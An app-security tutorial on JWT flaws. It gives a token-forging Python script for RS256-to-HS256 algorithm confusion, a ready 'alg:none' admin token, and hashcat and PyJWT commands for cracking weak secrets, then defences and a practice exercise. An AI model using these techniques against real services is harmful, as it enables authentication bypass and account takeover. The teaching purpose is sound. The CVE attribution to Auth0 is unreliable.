# JWT Vulnerabilities
**Category:** App Security
**Date:** 2026-09-16
**Difficulty:** Intermediate

---

## What It Is
JSON Web Tokens (JWTs) are a compact, self-contained mechanism for transmitting claims between parties as a signed JSON object. A JWT consists of three Base64URL-encoded parts — header, payload, and signature — separated by dots. Because the server trusts the token's claims without a database lookup, implementation flaws in how JWTs are created, validated, or stored can grant attackers full authentication bypass.

## Why It Matters
Broken JWT validation is a direct path to account takeover, privilege escalation, and full system compromise — without needing a password. Notable incidents include the 2018 Auth0 "alg:none" bypass that allowed unauthenticated users to forge admin tokens on any application using the affected library (CVE-2018-1000531). JWT misuse consistently appears in bug bounty reports and pentest findings across every industry.

## Practical Example

### Attack 1 — Algorithm Confusion (RS256 → HS256)

When a server uses RS256 (asymmetric), its *public key* is meant only for verification. But a vulnerable library will accept an HS256-signed token if the public key is used as the HMAC secret.

**Step-by-step:**
1. Obtain the server's RSA public key (often at `/.well-known/jwks.json`).
2. Forge a new payload with elevated privileges (e.g., `"role": "admin"`).
3. Sign it with HS256 using the public key as the secret.
4. The server's JWT library calls `verify(token, publicKey)` — which for HS256 validates successfully against the public key you already have.

```python
import jwt, base64

# Attacker grabs the public key from the JWKS endpoint
public_key = open("server_public.pem").read()

forged = jwt.encode(
    {"sub": "attacker", "role": "admin"},
    public_key,          # using PUBLIC key as HMAC secret
    algorithm="HS256"    # downgrading from RS256
)
print(forged)
```

### Attack 2 — "alg: none" Bypass

Some older libraries accept tokens with `"alg": "none"` and an empty signature, skipping verification entirely.

```
Header:  {"alg":"none","typ":"JWT"}
Payload: {"sub":"admin","role":"superuser"}
Signature: (empty)

Final token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJzdXBlcnVzZXIifQ.
```

### Attack 3 — Weak Secret Brute Force

If HS256 is used with a weak or default secret, an attacker can brute-force it offline:

```bash
# Using hashcat
hashcat -a 0 -m 16500 captured.jwt /usr/share/wordlists/rockyou.txt

# Once cracked, forge any payload
python3 -c "
import jwt
print(jwt.encode({'sub': 'admin'}, 'password123', algorithm='HS256'))
"
```

## How to Defend

- **Explicitly whitelist allowed algorithms** — never let the token header dictate which algorithm to use. Configure your library with a fixed allowlist: `jwt.decode(token, key, algorithms=["RS256"])`.
- **Reject "alg: none"** — ensure your JWT library version explicitly rejects unsigned tokens; most modern libraries (PyJWT ≥ 2.0, jsonwebtoken ≥ 9.0) do this by default.
- **Use strong, random secrets** — for HS256, use at least 256 bits of cryptographically random data (`openssl rand -hex 32`), never dictionary words or hardcoded strings.
- **Validate all standard claims** — always check `exp` (expiry), `iss` (issuer), and `aud` (audience). A valid signature on an expired or wrong-issuer token should still be rejected.
- **Keep libraries updated** — JWT algorithm confusion bugs are regularly patched. Pin a known-good version and monitor advisories.

## Today's Challenge

1. Go to [jwt.io](https://jwt.io) and decode any JWT (e.g., grab one from a logged-in session in your browser's DevTools under Application → Cookies or Local Storage).
2. Change the payload — modify a field like `role` or `email` — and observe that the signature becomes invalid.
3. Then install PyJWT (`pip install pyjwt`) and try signing a token with `algorithm="none"` — notice that modern library versions reject it.
4. **Bonus:** Run `hashcat` against a HS256 JWT signed with a weak secret (create one with `jwt.encode({"sub":"test"}, "secret", algorithm="HS256")`). Does it crack?

## Key Takeaway
Never trust the algorithm specified inside the JWT header — always enforce the algorithm server-side, or an attacker who controls the header controls your cryptographic guarantees.
